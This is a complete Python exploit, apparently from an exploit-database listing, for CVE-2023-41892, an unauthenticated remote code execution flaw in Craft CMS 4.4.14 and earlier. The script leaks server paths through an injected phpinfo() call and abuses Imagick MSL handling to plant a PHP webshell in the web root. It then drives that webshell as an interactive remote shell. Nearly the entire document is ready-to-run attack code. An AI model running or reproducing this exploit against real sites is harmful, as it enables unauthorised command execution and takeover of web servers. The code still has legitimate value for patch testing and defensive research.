@@ -1,0 +1,135 @@
+id: 39480
+date: 03/27/2024
+title: Craft CMS 4.4.14 - Unauthenticated Remote Code Execution Exploit
+author: Olivier Lasne
+cves: CVE-2023-41892
+
+#!/usr/bin/env python3
+#coding: utf-8
+
+# Exploit Title: Craft CMS unauthenticated Remote Code Execution (RCE)
+# Version: 4.0.0-RC1 - 4.4.14
+# Vendor Homepage: https://craftcms.com/
+# Software Link: https://github.com/craftcms/cms/releases/tag/4.4.14
+# Tested on: Ubuntu 22.04.3 LTS
+# Tested on: Craft CMS 4.4.14
+# Exploit Author: Olivier Lasne
+# CVE : CVE-2023-41892
+# References :
+# https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g
+# https://blog.calif.io/p/craftcms-rce
+
+import requests
+import sys, re
+
+if(len(sys.argv) < 2):
+    print(f"\033[1;96mUsage:\033[0m python {sys.argv[0]} \033[1;96m<url>\033[0m")
+    exit()
+
+HOST = sys.argv[1]
+
+if not re.match('^https?://.*', HOST):
+    print("\033[1;31m[-]\033[0m URL should start with http or https")
+    exit()
+
+print("\033[1;96m[+]\033[0m Executing phpinfo to extract some config infos")
+
+## Execute phpinfo() and extract config info from the website
+url = HOST + '/index.php'
+content_type = {'Content-Type': 'application/x-www-form-urlencoded'}
+
+data = r'action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()":[{"close":null}],"_fn_close":"phpinfo"}}'
+
+try:
+    r = requests.post(url, headers=content_type, data=data)
+except:
+    print(f"\033[1;31m[-]\033[0m Could not connect to {HOST}")
+    exit()
+
+# If we succeed, we should have default phpinfo credits 
+if not 'PHP Group' in r.text:
+	print(f'\033[1;31m[-]\033[0m {HOST} is not exploitable.')
+	exit()
+
+
+# Extract config value for tmp_dir and document_root
+pattern1 = r'<tr><td class="e">upload_tmp_dir<\/td><td class="v">(.*?)<\/td><td class="v">(.*?)<\/td><\/tr>'
+pattern2 = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td><\/tr>'
+
+tmp_dir       = re.search(pattern1, r.text, re.DOTALL).group(1)
+document_root = re.search(pattern2, r.text, re.DOTALL).group(1)
+
+
+if 'no value' in tmp_dir:
+	tmp_dir = '/tmp'
+
+print(f'temporary directory: {tmp_dir}')
+print(f'web server root: {document_root}')
+
+## Create shell.php in tmp_dir
+
+data = {
+    "action": "conditions/render",
+    "configObject[class]": "craft\elements\conditions\ElementCondition",
+    "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/passwd"}}}'
+}
+
+files = {
+    "image1": ("pwn1.msl", """<?xml version="1.0" encoding="UTF-8"?>
+    <image>
+    <read filename="caption:<?php @system(@$_REQUEST['cmd']); ?>"/>
+    <write filename="info:DOCUMENTROOT/shell.php"/>
+    </image>""".replace("DOCUMENTROOT", document_root), "text/plain")
+}
+
+print(f'\033[1;96m[+]\033[0m create shell.php in {tmp_dir}')
+r = requests.post(url, data=data, files=files) #, proxies={'http' : 'http://127.0.0.1:8080'}) #  
+
+
+# Use the Imagick trick to move the webshell in DOCUMENT_ROOT
+
+data = {
+    "action": "conditions/render",
+    "configObject[class]": r"craft\elements\conditions\ElementCondition",
+    "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + tmp_dir + r'/php*"}}}'
+}
+
+print(f'\033[1;96m[+]\033[0m trick imagick to move shell.php in {document_root}')
+r = requests.post(url, data=data) #, proxies={"http": "http://127.0.0.1:8080"})
+
+if r.status_code != 502:
+    print("\033[1;31m[-]\033[0m Exploit failed")
+    exit()
+
+print(f"\n\033[1;95m[+]\033[0m Webshell is deployed: {HOST}/\033[1mshell.php\033[0m?cmd=whoami")
+print(f"\033[1;95m[+]\033[0m Remember to \033[1mdelete shell.php\033[0m in \033[1m{document_root}\033[0m when you're done\n")
+print("\033[1;92m[!]\033[0m Enjoy your shell\n")
+
+url = HOST + '/shell.php'
+
+## Pseudo Shell
+while True:
+    command = input('\033[1;96m>\033[0m ')
+    if command == 'exit':
+        exit()
+
+    if command == 'clear' or command == 'cls':
+        print('\n' * 100)
+        print('\033[H\033[3J', end='')
+        continue
+
+    data = {'cmd' : command}
+    r = requests.post(url, data=data) #, proxies={"http": "http://127.0.0.1:8080"})
+
+    # exit if we have an error
+    if r.status_code != 200:
+        print(f"Error: status code {r.status_code} for {url}")
+        exit()
+
+    res_command = r.text
+    res_command = re.sub('^caption:', '', res_command)
+    res_command = re.sub(' CAPTION.*$', '', res_command)
+
+    print(res_command, end='')
+
+#  0day.today [2024-03-28]  #
